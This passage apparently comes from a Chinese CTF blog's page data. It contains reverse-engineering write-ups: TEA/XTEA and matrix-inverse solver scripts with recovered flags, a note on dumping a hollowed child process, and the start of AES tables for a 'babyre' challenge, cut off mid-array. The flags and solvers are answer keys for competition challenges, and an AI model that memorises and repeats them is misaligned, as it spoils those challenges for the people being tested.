&amp; 3]); sum_xtea += 0x75bcd15; v1 += (((v0 &lt;&lt; 4) ^ (v0 / 0x20)) + v0) ^ (sum_xtea + xtea_key[(sum_xtea / 0x800) &amp; 3]); sum_tea += 0x154cbf7; v0 += ((v1 &lt;&lt; 4) + tea_key[0]) ^ (v1 + sum_tea) ^ ((v1 / 0x20) + tea_key[1]); v1 += ((v0 &lt;&lt; 4) + tea_key[2]) ^ (v0 + sum_tea) ^ ((v0 / 0x20) + tea_key[3]); v[0] = v0; v[1] = v1;&#125; sum_tea 和 sum_xtea，对于每一组来说，初始值是不同的，比如第二组这里是0x798dcdf9 和 0xce0a6e55 最后通过打印三，四，五组第一个循环的日志，来与第二组的日志做对比，找到了所有组的初始的sum_tea 和 sum_xtea 123456int sum[4][2] = &#123; 0xCE0A6E55, 0x798dcdf9, 0x613673f9, 0x942dbd45, 0xf462799d, 0xaecdac91, 0x878e7f41, 0xc96d9bdd&#125;; 最终写脚本解密 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int sum[4][2] = &#123; 0xCE0A6E55, 0x798dcdf9, 0x613673f9, 0x942dbd45, 0xf462799d, 0xaecdac91, 0x878e7f41, 0xc96d9bdd&#125;;int tea_key[4] = &#123; 0X5354, 0x4f4d, 0x2074, 0x6561 &#125;;int xtea_key[4] = &#123; 0x494c, 0X6F76 , 0x6520, 0x4355 &#125;;void encrypt(int* v, int&amp; sum_xtea, int&amp; sum_tea)&#123; int v0 = v[0], v1 = v[1]; v0 += (((v1 &lt;&lt; 4) ^ (v1 / 0x20)) + v1) ^ (sum_xtea + xtea_key[sum_xtea &amp; 3]); sum_xtea += 0x75bcd15; v1 += (((v0 &lt;&lt; 4) ^ (v0 / 0x20)) + v0) ^ (sum_xtea + xtea_key[(sum_xtea / 0x800) &amp; 3]); sum_tea += 0x154cbf7; v0 += ((v1 &lt;&lt; 4) + tea_key[0]) ^ (v1 + sum_tea) ^ ((v1 / 0x20) + tea_key[1]); v1 += ((v0 &lt;&lt; 4) + tea_key[2]) ^ (v0 + sum_tea) ^ ((v0 / 0x20) + tea_key[3]); v[0] = v0; v[1] = v1;&#125;void decrypt(int* v, int&amp; sum_xtea, int&amp; sum_tea)&#123; int v0 = v[0], v1 = v[1]; v1 -= ((v0 &lt;&lt; 4) + tea_key[2]) ^ (v0 + sum_tea) ^ ((v0 / 0x20) + tea_key[3]); v0 -= ((v1 &lt;&lt; 4) + tea_key[0]) ^ (v1 + sum_tea) ^ ((v1 / 0x20) + tea_key[1]); sum_tea -= 0x154cbf7;; v1 -= (((v0 &lt;&lt; 4) ^ (v0 / 0x20)) + v0) ^ (sum_xtea + xtea_key[(sum_xtea / 0x800) &amp; 3]); sum_xtea -= 0x75bcd15; v0 -= (((v1 &lt;&lt; 4) ^ (v1 / 0x20)) + v1) ^ (sum_xtea + xtea_key[sum_xtea &amp; 3]); v[0] = v0; v[1] = v1;&#125;char compare_date[100] = //这里是从程序中提取的加密后的flag的值&#123; 0xE8, 0xFA, 0xE0, 0xAE, 0x01, 0x41, 0x3E, 0xFC, 0x92, 0xAD, 0x7C, 0x16, 0xBE, 0x6C, 0xEA, 0x51, 0x00, 0x01, 0x2A, 0x24, 0x1B, 0x1A, 0x51, 0x01, 0x94, 0x66, 0x4D, 0x51, 0xEB, 0xBF, 0x5F, 0x2F, 0x98, 0x63, 0xD3, 0x46, 0xF0, 0xE3, 0xEE, 0x79&#125;;int main()&#123; int v[2] = &#123; 0 &#125;; int* encFlag = (int*)compare_date; //flag的前8个字符爆破得到的 L3HCTF&#123;D for (int j = 0; j &lt; 4; j++) //后32个字符，分4组 &#123; for (int i = 0; i &lt; 20; i++) encrypt(v, sum[j][0], sum[j][1]); //提升sum_xtea 和 sum_tea for (int i = 0; i &lt; 20; i++) decrypt(&amp;encFlag[j * 2 + 2], sum[j][0], sum[j][1]); &#125; char* flag = (char*)&amp;encFlag[2]; printf(&quot;flag is L3HCTF&#123;D%s \\n&quot;, flag); return 0;&#125;// L3HCTF&#123;D0uBle_vM_W1th_dOubIe_TEA&#125; LoadIDA打开程序分析 进入LOAD_PE函数，就是创建了个傀儡进程 在ResumeThread这里下断点，dump，然后foremost分离 注意在foremost分离的时候要把dump下来的程序的MZ头抹去，这样才能分离解密后的PE文件来 IDA打开分析 获取flag后，对flag中的字符在 0x30-0x39或 a-f 范围做了个小处理 12340x30 - 0x39 ---&gt; 0x00 - 0x09a - f ---&gt; 0xA ---0xF# 然后假设输入的是123f --&gt; 0x12, 0x3f 存在了0x434380的位置 注意这里全是对应的十六进制，猜测输入的flag的范围就是[0-9a-f] 最终434380处的数据是13个。下面又分为9 + 4 个，正好是3和2的平方，并且下面验证的时候也是分为9 + 4进行验证的 猜测是3 * 3 + 2 * 2的某个矩阵运算, 在上述图89行位置下断点，修改src处的数据为100010001, 12341 0 00 1 00 0 1正好是单位矩阵 然后运行，加密后发现Src处的数据没变，但是v29处的数据全乱了，猜测是逆矩阵 提取出加密后Src 和 v29处的数据 12345678Src: 1 0 -90 -1 -6-1 -2 -4 v29:7 330 13 写脚本求逆矩阵，并转换为flag 12345678910111213141516171819import numpyif __name__ == &quot;__main__&quot;: a = numpy.array([[1, 0, -9], [0, -1, -6], [-1, -2, -4]]) b = numpy.array([[7, 3], [30, 13]]) a_inv = numpy.linalg.inv(a) b_inv = numpy.linalg.inv(b) a_list = [list(i) for i in a_inv] b_list = [list(i) for i in b_inv] flag_list = a_list[0] + a_list[1] + a_list[2] + b_list[0] + b_list[1] flag_list = [int(i) &amp; 0xff for i in flag_list] flag = bytes(flag_list).hex() print(flag) # f812f706f306ff02ff0dfde207 拼接后进行验证，Load.exe在 ResumeThread那里下断点，输入flag，程序断下，在运行dump提取出来的exe，验证成功 最终flag为 : flag&#123;f812f706f306ff02ff0dfde207&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"CTFWP","slug":"CTFWP","permalink":"https://zzzzsky.github.io/tags/CTFWP/"},{"name":"vm","slug":"vm","permalink":"https://zzzzsky.github.io/tags/vm/"}]},{"title":"2021强网拟态_babyre","slug":"2021强网拟态_babyre","date":"2021-11-11T16:00:00.000Z","updated":"2021-11-29T11:42:10.176Z","comments":true,"path":"2021/11/12/2021强网拟态_babyre/","link":"","permalink":"https://zzzzsky.github.io/2021/11/12/2021%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81_babyre/","excerpt":"","text":"2021强网拟态rebabyreIDA动态调试，进入关键函数 分析函数，提取数据，还原算法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142#include &lt;stdio.h&gt;typedef unsigned char BYTE;typedef unsigned long DWORD;char _flag[] = &quot;1234567890123456&quot;;DWORD cmp_data[8] = &#123;0xE82BA79E, 0x83EA91DE, 0x241BCCFE, 0x2836973B, 0x5F86C92D, 0x0C8094E88, 0x0FEC81BB0, 0x0D5277623&#125;;DWORD key[60] = &#123;0xc3bb95b, 0x578c9d63, 0x7faca21c, 0x29522e93, 0xb268681, 0xda705e01, 0xa7732a53, 0x72e0c013, 0x4b4fcf3b, 0xe46963a6, 0x3eeea9d2, 0xefb38fbb, 0xd156d880, 0x7d037452, 0xd593ea40, 0xd5223126, 0xaf26ac9d, 0xda87ca74, 0xd15d2669, 0x6cadaad, 0xac55acd2, 0xa8909e12, 0xb1db66, 0xcc4c1870, 0x75a166e9, 0xbdaec1d, 0xd797fcc4, 0x9cd3659b, 0x4c532c0, 0xa8214574, 0xccfdc316, 0x6019b4a2, 0x7e7b8af4, 0xdc4d10d9, 0x4b44995f, 0x2ca5c858, 0xace477b4, 0x64dc8662, 0xace477b4, 0xbbc35df5, 0xa2369a2d, 0x97098986, 0x67e15107, 0xfd0b6e21, 0xc838f1d6, 0xc838f1d6, 0x17272a41, 0x38f9ff4a, 0x353f13ab, 0xf0e8d881, 0x9aea3f26, 0x5f3df40c, 0x0, 0xdf1fdb97, 0x2fded50b, 0x49b04218, 0xf3000000, 0xc3fa1e0f, 0xf3000000, 0x841f&#125;;DWORD dword_405420[256] = &#123;0xa7f45150, 0x65417e53, 0xa4171ac3, 0x5e273a96, 0x6bab3bcb, 0x459d1ff1, 0x58faacab, 0x3e34b93, 0xfa302055, 0x6d76adf6, 0x76cc8891, 0x4c02f525, 0xd7e54ffc, 0xcb2ac5d7, 0x44352680, 0xa362b58f, 0x5ab1de49, 0x1bba2567, 0xeea4598, 0xc0fe5de1, 0x752fc302, 0xf04c8112, 0x97468da3, 0xf9d36bc6, 0x5f8f03e7, 0x9c921595, 0x7a6dbfeb, 0x595295da, 0x83bed42d, 0x217458d3, 0x69e04929, 0xc8c98e44, 0x89c2756a, 0x798ef478, 0x3e58996b, 0x71b927dd, 0x4fe1beb6, 0xad88f017, 0xac20c966, 0x3ace7db4, 0x4adf6318, 0x311ae582, 0x33519760, 0x7f536245, 0x7764b1e0, 0xae6bbb84, 0xa081fe1c, 0x2b08f994, 0x68487058, 0xfd458f19, 0x6cde9487, 0xf87b52b7, 0xd373ab23, 0x24b72e2, 0x8f1fe357, 0xab55662a, 0x28ebb207, 0xc2b52f03, 0x7bc5869a, 0x837d3a5, 0x872830f2, 0xa5bf23b2, 0x6a0302ba, 0x8216ed5c, 0x1ccf8a2b, 0xb479a792, 0xf207f3f0, 0xe2694ea1, 0xf4da65cd, 0xbe0506d5, 0x6234d11f, 0xfea6c48a, 0x532e349d, 0x55f3a2a0, 0xe18a0532, 0xebf6a475, 0xec830b39, 0xef6040aa, 0x9f715e06, 0x106ebd51, 0x8a213ef9, 0x6dd963d, 0x53eddae, 0xbde64d46, 0x8d5491b5, 0x5dc47105, 0xd406046f, 0x155060ff, 0xfb981924, 0xe9bdd697, 0x434089cc, 0x9ed96777, 0x42e8b0bd, 0x8b890788, 0x5b19e738, 0xeec879db, 0xa7ca147, 0xf427ce9, 0x1e84f8c9, 0x0, 0x86800983, 0xed2b3248, 0x70111eac, 0x725a6c4e, 0xff0efdfb, 0x38850f56, 0xd5ae3d1e, 0x392d3627, 0xd90f0a64, 0xa65c6821, 0x545b9bd1, 0x2e36243a, 0x670a0cb1, 0xe757930f, 0x96eeb4d2, 0x919b1b9e, 0xc5c0804f, 0x20dc61a2, 0x4b775a69, 0x1a121c16, 0xba93e20a, 0x2aa0c0e5, 0xe0223c43, 0x171b121d, 0xd090e0b, 0xc78bf2ad, 0xa8b62db9, 0xa91e14c8, 0x19f15785, 0x775af4c, 0xdd99eebb, 0x607fa3fd, 0x2601f79f, 0xf5725cbc, 0x3b6644c5, 0x7efb5b34, 0x29438b76, 0xc623cbdc, 0xfcedb668, 0xf1e4b863, 0xdc31d7ca, 0x85634210, 0x22971340, 0x11c68420, 0x244a857d, 0x3dbbd2f8, 0x32f9ae11, 0xa129c76d, 0x2f9e1d4b, 0x30b2dcf3, 0x52860dec, 0xe3c177d0, 0x16b32b6c, 0xb970a999, 0x489411fa, 0x64e94722, 0x8cfca8c4, 0x3ff0a01a, 0x2c7d56d8, 0x903322ef, 0x4e4987c7, 0xd138d9c1, 0xa2ca8cfe, 0xbd49836, 0x81f5a6cf, 0xde7aa528, 0x8eb7da26, 0xbfad3fa4, 0x9d3a2ce4, 0x9278500d, 0xcc5f6a9b, 0x467e5462, 0x138df6c2, 0xb8d890e8, 0xf7392e5e, 0xafc382f5, 0x805d9fbe, 0x93d0697c, 0x2dd56fa9, 0x1225cfb3, 0x99acc83b, 0x7d1810a7, 0x639ce86e, 0xbb3bdb7b, 0x7826cd09, 0x18596ef4, 0xb79aec01, 0x9a4f83a8, 0x6e95e665, 0xe6ffaa7e, 0xcfbc2108, 0xe815efe6, 0x9be7bad9, 0x366f4ace, 0x99fead4, 0x7cb029d6, 0xb2a431af, 0x233f2a31, 0x94a5c630, 0x66a235c0, 0xbc4e7437, 0xca82fca6, 0xd090e0b0, 0xd8a73315, 0x9804f14a, 0xdaec41f7, 0x50cd7f0e, 0xf691172f, 0xd64d768d, 0xb0ef434d, 0x4daacc54, 0x496e4df, 0xb5d19ee3, 0x886a4c1b, 0x1f2cc1b8, 0x5165467f, 0xea5e9d04, 0x358c015d, 0x7487fa73, 0x410bfb2e, 0x1d67b35a, 0xd2db9252, 0x5610e933, 0x47d66d13, 0x61d79a8c, 0xca1377a, 0x14f8598e, 0x3c13eb89, 0x27a9ceee, 0xc961b735, 0xe51ce1ed, 0xb1477a3c, 0xdfd29c59, 0x73f2553f, 0xce141879, 0x37c773bf, 0xcdf753ea, 0xaafd5f5b, 0x6f3ddf14, 0xdb447886, 0xf3afca81, 0xc468b93e, 0x3424382c, 0x40a3c25f, 0xc31d1672, 0x25e2bc0c, 0x493c288b, 0x950dff41, 0x1a83971, 0xb30c08de, 0xe4b4d89c, 0xc1566490, 0x84cb7b61, 0xb632d570, 0x5c6c4874, 0x57b8d042&#125;;DWORD dword_405820[256] = &#123;0xf45150a7, 0x417e5365, 0x171ac3a4, 0x273a965e, 0xab3bcb6b, 0x9d1ff145, 0xfaacab58, 0xe34b9303, 0x302055fa, 0x76adf66d, 0xcc889176, 0x2f5254c, 0xe54ffcd7, 0x2ac5d7cb, 0x35268044, 0x62b58fa3, 0xb1de495a, 0xba25671b, 0xea45980e, 0xfe5de1c0, 0x2fc30275, 0x4c8112f0, 0x468da397, 0xd36bc6f9, 0x8f03e75f, 0x9215959c, 0x6dbfeb7a, 0x5295da59, 0xbed42d83, 0x7458d321, 0xe0492969, 0xc98e44c8, 0xc2756a89, 0x8ef47879, 0x58996b3e, 0xb927dd71, 0xe1beb64f, 0x88f017ad, 0x20c966ac, 0xce7db43a, 0xdf63184a, 0x1ae58231, 0x51976033, 0x5362457f, 0x64b1e077, 0x6bbb84ae, 0x81fe1ca0, 0x8f9942b, 0x48705868, 0x458f19fd, 0xde94876c, 0x7b52b7f8, 0x73ab23d3, 0x4b72e202, 0x1fe3578f, 0x55662aab, 0xebb20728, 0xb52f03c2, 0xc5869a7b, 0x37d3a508, 0x2830f287, 0xbf23b2a5, 0x302ba6a, 0x16ed5c82, 0xcf8a2b1c, 0x79a792b4, 0x7f3f0f2, 0x694ea1e2, 0xda65cdf4, 0x506d5be, 0x34d11f62, 0xa6c48afe, 0x2e349d53, 0xf3a2a055, 0x8a0532e1, 0xf6a475eb, 0x830b39ec, 0x6040aaef, 0x715e069f, 0x6ebd5110, 0x213ef98a, 0xdd963d06, 0x3eddae05, 0xe64d46bd, 0x5491b58d, 0xc471055d, 0x6046fd4, 0x5060ff15, 0x981924fb, 0xbdd697e9, 0x4089cc43, 0xd967779e, 0xe8b0bd42, 0x8907888b, 0x19e7385b, 0xc879dbee, 0x7ca1470a, 0x427ce90f, 0x84f8c91e, 0x0, 0x80098386, 0x2b3248ed, 0x111eac70, 0x5a6c4e72, 0xefdfbff, 0x850f5638, 0xae3d1ed5, 0x2d362739, 0xf0a64d9, 0x5c6821a6, 0x5b9bd154, 0x36243a2e, 0xa0cb167, 0x57930fe7, 0xeeb4d296, 0x9b1b9e91, 0xc0804fc5, 0xdc61a220, 0x775a694b, 0x121c161a, 0x93e20aba, 0xa0c0e52a, 0x223c43e0, 0x1b121d17, 0x90e0b0d, 0x8bf2adc7, 0xb62db9a8, 0x1e14c8a9, 0xf1578519, 0x75af4c07, 0x99eebbdd, 0x7fa3fd60, 0x1f79f26, 0x725cbcf5, 0x6644c53b, 0xfb5b347e, 0x438b7629, 0x23cbdcc6, 0xedb668fc, 0xe4b863f1, 0x31d7cadc, 0x63421085, 0x97134022, 0xc6842011, 0x4a857d24, 0xbbd2f83d, 0xf9ae1132, 0x29c76da1, 0x9e1d4b2f, 0xb2dcf330, 0x860dec52, 0xc177d0e3, 0xb32b6c16, 0x70a999b9, 0x9411fa48, 0xe9472264, 0xfca8c48c, 0xf0a01a3f, 0x7d56d82c, 0x3322ef90, 0x4987c74e, 0x38d9c1d1, 0xca8cfea2, 0xd498360b, 0xf5a6cf81, 0x7aa528de, 0xb7da268e, 0xad3fa4bf, 0x3a2ce49d, 0x78500d92, 0x5f6a9bcc, 0x7e546246, 0x8df6c213, 0xd890e8b8, 0x392e5ef7, 0xc382f5af, 0x5d9fbe80, 0xd0697c93, 0xd56fa92d, 0x25cfb312, 0xacc83b99, 0x1810a77d, 0x9ce86e63, 0x3bdb7bbb, 0x26cd0978, 0x596ef418, 0x9aec01b7, 0x4f83a89a, 0x95e6656e, 0xffaa7ee6, 0xbc2108cf, 0x15efe6e8, 0xe7bad99b, 0x6f4ace36, 0x9fead409, 0xb029d67c, 0xa431afb2, 0x3f2a3123, 0xa5c63094, 0xa235c066, 0x4e7437bc, 0x82fca6ca, 0x90e0b0d0, 0xa73315d8, 0x4f14a98, 0xec41f7da, 0xcd7f0e50, 0x91172ff6, 0x4d768dd6, 0xef434db0, 0xaacc544d, 0x96e4df04, 0xd19ee3b5, 0x6a4c1b88, 0x2cc1b81f, 0x65467f51, 0x5e9d04ea, 0x8c015d35, 0x87fa7374, 0xbfb2e41, 0x67b35a1d, 0xdb9252d2, 0x10e93356, 0xd66d1347, 0xd79a8c61, 0xa1377a0c, 0xf8598e14, 0x13eb893c, 0xa9ceee27, 0x61b735c9, 0x1ce1ede5, 0x477a3cb1, 0xd29c59df, 0xf2553f73, 0x141879ce, 0xc773bf37, 0xf753eacd, 0xfd5f5baa, 0x3ddf146f, 0x447886db, 0xafca81f3, 0x68b93ec4, 0x24382c34, 0xa3c25f40, 0x1d1672c3, 0xe2bc0c25, 0x3c288b49, 0xdff4195, 0xa8397101, 0xc08deb3, 0xb4d89ce4, 0x566490c1, 0xcb7b6184, 0x32d570b6, 0x6c48745c, 0xb8d04257&#125;;DWORD dword_405C20[256] = &#123;0x5150a7f4, 0x7e536541, 0x1ac3a417, 0x3a965e27, 0x3bcb6bab, 0x1ff1459d, 0xacab58fa, 0x4b9303e3, 0x2055fa30, 0xadf66d76, 0x889176cc, 0xf5254c02, 0x4ffcd7e5, 0xc5d7cb2a, 0x26804435, 0xb58fa362, 0xde495ab1, 0x25671bba, 0x45980eea, 0x5de1c0fe, 0xc302752f, 0x8112f04c, 0x8da39746, 0x6bc6f9d3, 0x3e75f8f, 0x15959c92, 0xbfeb7a6d, 0x95da5952, 0xd42d83be, 0x58d32174, 0x492969e0, 0x8e44c8c9, 0x756a89c2, 0xf478798e, 0x996b3e58, 0x27dd71b9, 0xbeb64fe1, 0xf017ad88, 0xc966ac20, 0x7db43ace, 0x63184adf, 0xe582311a, 0x97603351, 0x62457f53, 0xb1e07764, 0xbb84ae6b, 0xfe1ca081, 0xf9942b08, 0x70586848, 0x8f19fd45, 0x94876cde, 0x52b7f87b, 0xab23d373, 0x72e2024b, 0xe3578f1f, 0x662aab55, 0xb20728eb, 0x2f03c2b5, 0x869a7bc5, 0xd3a50837, 0x30f28728, 0x23b2a5bf, 0x2ba6a03, 0xed5c8216, 0x8a2b1ccf, 0xa792b479, 0xf3f0f207, 0x4ea1e269, 0x65cdf4da, 0x6d5be05, 0xd11f6234, 0xc48afea6, 0x349d532e, 0xa2a055f3, 0x532e18a, 0xa475ebf6, 0xb39ec83, 0x40aaef60, 0x5e069f71, 0xbd51106e, 0x3ef98a21, 0x963d06dd, 0xddae053e, 0x4d46bde6, 0x91b58d54, 0x71055dc4, 0x46fd406, 0x60ff1550, 0x1924fb98, 0xd697e9bd, 0x89cc4340, 0x67779ed9, 0xb0bd42e8, 0x7888b89, 0xe7385b19, 0x79dbeec8, 0xa1470a7c, 0x7ce90f42, 0xf8c91e84, 0x0, 0x9838680, 0x3248ed2b, 0x1eac7011, 0x6c4e725a, 0xfdfbff0e, 0xf563885, 0x3d1ed5ae, 0x3627392d, 0xa64d90f, 0x6821a65c, 0x9bd1545b, 0x243a2e36, 0xcb1670a, 0x930fe757, 0xb4d296ee, 0x1b9e919b, 0x804fc5c0, 0x61a220dc, 0x5a694b77, 0x1c161a12, 0xe20aba93, 0xc0e52aa0, 0x3c43e022, 0x121d171b, 0xe0b0d09, 0xf2adc78b, 0x2db9a8b6, 0x14c8a91e, 0x578519f1, 0xaf4c0775, 0xeebbdd99, 0xa3fd607f, 0xf79f2601, 0x5cbcf572, 0x44c53b66, 0x5b347efb, 0x8b762943, 0xcbdcc623, 0xb668fced, 0xb863f1e4, 0xd7cadc31, 0x42108563, 0x13402297, 0x842011c6, 0x857d244a, 0xd2f83dbb, 0xae1132f9, 0xc76da129, 0x1d4b2f9e, 0xdcf330b2, 0xdec5286, 0x77d0e3c1, 0x2b6c16b3, 0xa999b970, 0x11fa4894, 0x472264e9, 0xa8c48cfc, 0xa01a3ff0, 0x56d82c7d, 0x22ef9033, 0x87c74e49, 0xd9c1d138, 0x8cfea2ca, 0x98360bd4, 0xa6cf81f5, 0xa528de7a, 0xda268eb7, 0x3fa4bfad, 0x2ce49d3a, 0x500d9278, 0x6a9bcc5f, 0x5462467e, 0xf6c2138d, 0x90e8b8d8, 0x2e5ef739, 0x82f5afc3, 0x9fbe805d, 0x697c93d0, 0x6fa92dd5, 0xcfb31225, 0xc83b99ac, 0x10a77d18, 0xe86e639c, 0xdb7bbb3b, 0xcd097826, 0x6ef41859, 0xec01b79a, 0x83a89a4f, 0xe6656e95, 0xaa7ee6ff, 0x2108cfbc, 0xefe6e815, 0xbad99be7, 0x4ace366f, 0xead4099f, 0x29d67cb0, 0x31afb2a4, 0x2a31233f, 0xc63094a5, 0x35c066a2, 0x7437bc4e, 0xfca6ca82, 0xe0b0d090, 0x3315d8a7, 0xf14a9804, 0x41f7daec, 0x7f0e50cd, 0x172ff691, 0x768dd64d, 0x434db0ef, 0xcc544daa, 0xe4df0496, 0x9ee3b5d1, 0x4c1b886a, 0xc1b81f2c, 0x467f5165, 0x9d04ea5e, 0x15d358c, 0xfa737487, 0xfb2e410b, 0xb35a1d67, 0x9252d2db, 0xe9335610, 0x6d1347d6, 0x9a8c61d7, 0x377a0ca1, 0x598e14f8, 0xeb893c13, 0xceee27a9, 0xb735c961, 0xe1ede51c, 0x7a3cb147, 0x9c59dfd2, 0x553f73f2, 0x1879ce14, 0x73bf37c7, 0x53eacdf7, 0x5f5baafd, 0xdf146f3d, 0x7886db44, 0xca81f3af, 0xb93ec468, 0x382c3424, 0xc25f40a3, 0x1672c31d, 0xbc0c25e2, 0x288b493c, 0xff41950d, 0x397101a8, 0x8deb30c, 0xd89ce4b4, 0x6490c156, 0x7b6184cb, 0xd570b632, 0x48745c6c, 0xd04257b8&#125;;DWORD dword_405020[256] = &#123;0x50a7f451, 0x5365417e, 0xc3a4171a, 0x965e273a, 0xcb6bab3b, 0xf1459d1f, 0xab58faac, 0x9303e34b, 0x55fa3020, 0xf66d76ad, 0x9176cc88, 0x254c02f5, 0xfcd7e54f, 0xd7cb2ac5, 0x80443526, 0x8fa362b5, 0x495ab1de, 0x671bba25, 0x980eea45, 0xe1c0fe5d, 0x2752fc3, 0x12f04c81, 0xa397468d, 0xc6f9d36b, 0xe75f8f03, 0x959c9215, 0xeb7a6dbf, 0xda595295, 0x2d83bed4, 0xd3217458, 0x2969e049, 0x44c8c98e, 0x6a89c275, 0x78798ef4, 0x6b3e5899, 0xdd71b927, 0xb64fe1be, 0x17ad88f0, 0x66ac20c9, 0xb43ace7d, 0x184adf63, 0x82311ae5, 0x60335197, 0x457f5362, 0xe07764b1, 0x84ae6bbb, 0x1ca081fe, 0x942b08f9, 0x58684870, 0x19fd458f, 0x876cde94, 0xb7f87b52, 0x23d373ab, 0xe2024b72, 0x578f1fe3, 0x2aab5566, 0x728ebb2, 0x3c2b52f, 0x9a7bc586, 0xa50837d3, 0xf2872830, 0xb2a5bf23, 0xba6a0302, 0x5c8216ed, 0x2b1ccf8a, 0x92b479a7, 0xf0f207f3, 0xa1e2694e, 0xcdf4da65, 0xd5be0506, 0x1f6234d1, 0x8afea6c4, 0x9d532e34, 0xa055f3a2, 0x32e18a05, 0x75ebf6a4, 0x39ec830b, 0xaaef6040, 0x69f715e, 0x51106ebd, 0xf98a213e, 0x3d06dd96, 0xae053edd, 0x46bde64d, 0xb58d5491, 0x55dc471, 0x6fd40604, 0xff155060, 0x24fb9819, 0x97e9bdd6, 0xcc434089, 0x779ed967, 0xbd42e8b0, 0x888b8907, 0x385b19e7, 0xdbeec879, 0x470a7ca1, 0xe90f427c, 0xc91e84f8, 0x0, 0x83868009, 0x48ed2b32, 0xac70111e, 0x4e725a6c, 0xfbff0efd, 0x5638850f, 0x1ed5ae3d, 0x27392d36, 0x64d90f0a, 0x21a65c68, 0xd1545b9b, 0x3a2e3624, 0xb1670a0c, 0xfe75793, 0xd296eeb4, 0x9e919b1b, 0x4fc5c080, 0xa220dc61, 0x694b775a, 0x161a121c, 0xaba93e2, 0xe52aa0c0, 0x43e0223c, 0x1d171b12, 0xb0d090e, 0xadc78bf2, 0xb9a8b62d, 0xc8a91e14, 0x8519f157, 0x4c0775af, 0xbbdd99ee, 0xfd607fa3, 0x9f2601f7, 0xbcf5725c, 0xc53b6644, 0x347efb5b, 0x7629438b, 0xdcc623cb, 0x68fcedb6, 0x63f1e4b8, 0xcadc31d7, 0x10856342, 0x40229713, 0x2011c684, 0x7d244a85, 0xf83dbbd2, 0x1132f9ae, 0x6da129c7, 0x4b2f9e1d, 0xf330b2dc, 0xec52860d, 0xd0e3c177, 0x6c16b32b, 0x99b970a9, 0xfa489411, 0x2264e947, 0xc48cfca8, 0x1a3ff0a0, 0xd82c7d56, 0xef903322, 0xc74e4987, 0xc1d138d9, 0xfea2ca8c, 0x360bd498, 0xcf81f5a6, 0x28de7aa5, 0x268eb7da, 0xa4bfad3f, 0xe49d3a2c, 0xd927850, 0x9bcc5f6a, 0x62467e54, 0xc2138df6, 0xe8b8d890, 0x5ef7392e, 0xf5afc382, 0xbe805d9f, 0x7c93d069, 0xa92dd56f, 0xb31225cf, 0x3b99acc8, 0xa77d1810, 0x6e639ce8, 0x7bbb3bdb, 0x97826cd, 0xf418596e, 0x1b79aec, 0xa89a4f83, 0x656e95e6, 0x7ee6ffaa, 0x8cfbc21, 0xe6e815ef, 0xd99be7ba, 0xce366f4a, 0xd4099fea, 0xd67cb029, 0xafb2a431, 0x31233f2a, 0x3094a5c6, 0xc066a235, 0x37bc4e74, 0xa6ca82fc, 0xb0d090e0, 0x15d8a733, 0x4a9804f1, 0xf7daec41, 0xe50cd7f, 0x2ff69117, 0x8dd64d76, 0x4db0ef43, 0x544daacc, 0xdf0496e4, 0xe3b5d19e, 0x1b886a4c, 0xb81f2cc1, 0x7f516546, 0x4ea5e9d, 0x5d358c01, 0x737487fa, 0x2e410bfb, 0x5a1d67b3, 0x52d2db92, 0x335610e9, 0x1347d66d, 0x8c61d79a, 0x7a0ca137, 0x8e14f859, 0x893c13eb, 0xee27a9ce, 0x35c961b7, 0xede51ce1, 0x3cb1477a, 0x59dfd29c, 0x3f73f255, 0x79ce1418, 0xbf37c773, 0xeacdf753, 0x5baafd5f, 0x146f3ddf, 0x86db4478, 0x81f3afca, 0x3ec468b9, 0x2c342438, 0x5f40a3c2, 0x72c31d16, 0xc25e2bc, 0x8b493c28, 0x41950dff, 0x7101a839, 0xdeb30c08, 0x9ce4b4d8, 0x90c15664, 0x6184cb7b, 0x70b632d5, 0x745c6c48, 0x4257b8d0&#125;;BYTE RijnDael_AES_LONG_inv_406120[256] = &#123;0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 